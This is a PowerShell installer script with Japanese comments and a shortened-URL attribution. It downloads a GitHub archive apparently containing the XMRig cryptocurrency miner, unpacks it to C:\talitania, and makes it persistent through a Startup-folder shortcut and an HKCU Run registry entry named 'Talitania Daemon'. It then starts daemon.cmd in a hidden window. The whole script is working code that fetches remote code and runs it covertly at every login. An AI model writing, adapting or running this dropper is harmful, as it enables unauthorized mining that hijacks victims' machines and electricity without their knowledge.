<#
  動的インストールファイル
  このスクリプトの再配布・改変は禁止されています。
  提供元: is.gd/daoxin
#>

[CmdletBinding()]
param()

function Write-Info($m) { Write-Host "[INFO] $m" }
function Write-Warn($m) { Write-Warning "[WARN] $m" }

# ログヘルパー（ログファイルに追加して表示）
function Log-Write($level, $msg) {
    try {
        $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        # 表示用のレベル表記を日本語に変換（内部のロジックは level で判断）
        switch ($level) {
            'ERROR' { $disp = 'エラー' }
            'WARN'  { $disp = '警告' }
            default { $disp = '情報' }
        }
        $line = "{0} [{1}] {2}" -f $ts, $disp, $msg
        if ($Global:LogFile) { Add-Content -Path $Global:LogFile -Value $line -ErrorAction SilentlyContinue }
        switch ($level) {
            'ERROR' { Write-Error $msg }
            'WARN'  { Write-Warn $msg }
            default { Write-Host $line }
        }
    } catch {
        Write-Host "[LOG-ERROR] $_"
    }
}

try {
    $rep = 'https://github.com/5q0r/xmrig-shared'
    $zipuri = "$rep/archive/refs/heads/main.zip"
    $tzip = Join-Path $env:TEMP 'xmrig-shared.zip'
    $text = Join-Path $env:TEMP 'xmrig-shared-extract'
    $loc = 'C:\talitania'
    $sta = [Environment]::GetFolderPath('Startup')
    $spath = Join-Path $sta 'Talitania.lnk'
    $rname = 'Talitania Daemon'

    # 宛先ディレクトリが存在しない場合は作成する
    if (-not (Test-Path $loc)) {
        New-Item -Path $loc -ItemType Directory | Out-Null
    }
    $Global:LogFile = Join-Path $loc 'setup.log'
    Log-Write 'INFO' "スクリプト開始。宛先: $loc"
    Log-Write 'INFO' "ユーザー: $($env:USERNAME); コンピューター: $($env:COMPUTERNAME); PSVersion: $($PSVersionTable.PSVersion)"

    Log-Write 'INFO' 'リポジトリ (branch main) をダウンロード中...'
    Invoke-WebRequest -Uri $zipuri -OutFile $tzip -UseBasicParsing -ErrorAction Stop
    Log-Write 'INFO' "ZIP を保存しました: $tzip"

    if (Test-Path $text) { Remove-Item -Recurse -Force $text }
    Log-Write 'INFO' "ZIP を展開中: $text"
    Expand-Archive -Path $tzip -DestinationPath $text -Force
    Remove-Item $tzip -Force
    Log-Write 'INFO' '展開完了。'

    $pastaExtraida = Get-ChildItem -Path $text | Where-Object { $_.PSIsContainer } | Select-Object -First 1
    if (-not $pastaExtraida) { throw 'Não foi possível localizar a pasta extraída do repositório.' }
    $sourcePath = $pastaExtraida.FullName
    Log-Write 'INFO' "展開フォルダ: $sourcePath"

    # アセットのコンテンツを宛先ルートディレクトリにコピーします（「assets」サブフォルダは作成しないでください）
    $sourceAssets = Join-Path $sourcePath 'assets'
    if (Test-Path $sourceAssets) {
    Log-Write 'INFO' "assets の内容を $loc にコピーしています..."
        # アセット内のすべてのアイテムを宛先（ファイルとフォルダ）にコピーします
        Copy-Item -Path (Join-Path $sourceAssets '*') -Destination $loc -Recurse -Force
    Log-Write 'INFO' 'assets のコピー完了。'
    } else {
        Log-Write 'WARN' 'リポジトリに assets フォルダが見つかりません。'
    }

    # 役立つファイル（README、LICENSE）が存在する場合はコピーします
    foreach ($f in @('README.md','LICENSE')) {
        $s = Join-Path $sourcePath $f
    if (Test-Path $s) { Copy-Item -Path $s -Destination $loc -Force; Log-Write 'INFO' "$f をコピーしました" }
    }

    # クリーニング
    Remove-Item -Recurse -Force $text
    Log-Write 'INFO' '一時ファイルのクリーンアップ完了。'

    # デーモンの起動ショートカットとレジストリの実行を準備する
    $daemonPath = Join-Path $loc 'daemon.cmd'
    if (Test-Path $daemonPath) {
    Log-Write 'INFO' "スタートアップフォルダにショートカットを作成します: $spath"
        $wsh = New-Object -ComObject WScript.Shell
        $shortcut = $wsh.CreateShortcut($spath)
        $shortcut.TargetPath = $daemonPath
        $shortcut.WorkingDirectory = Split-Path $daemonPath -Parent
        $shortcut.IconLocation = $daemonPath
        $shortcut.Save()

    Log-Write 'INFO' 'ログイン時にデーモンを起動するため、HKCU Run にエントリを作成/更新します...'
        $regValue = '"' + $daemonPath + '"'
        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $rname -Value $regValue

        Log-Write 'INFO' 'デーモンを一度実行します（バックグラウンド）...'
        Start-Process -FilePath $daemonPath -WindowStyle Hidden
        Log-Write 'INFO' 'デーモンを起動しました（単回実行）。'
    } else {
        Log-Write 'WARN' "$daemonPath が見つかりません — ショートカット/登録はスキップします。"
    }

    Log-Write 'INFO' 'セットアップ完了。'
    exit 0

} catch {
    Log-Write 'ERROR' "セットアップ中にエラーが発生しました: $_"
    exit 1
}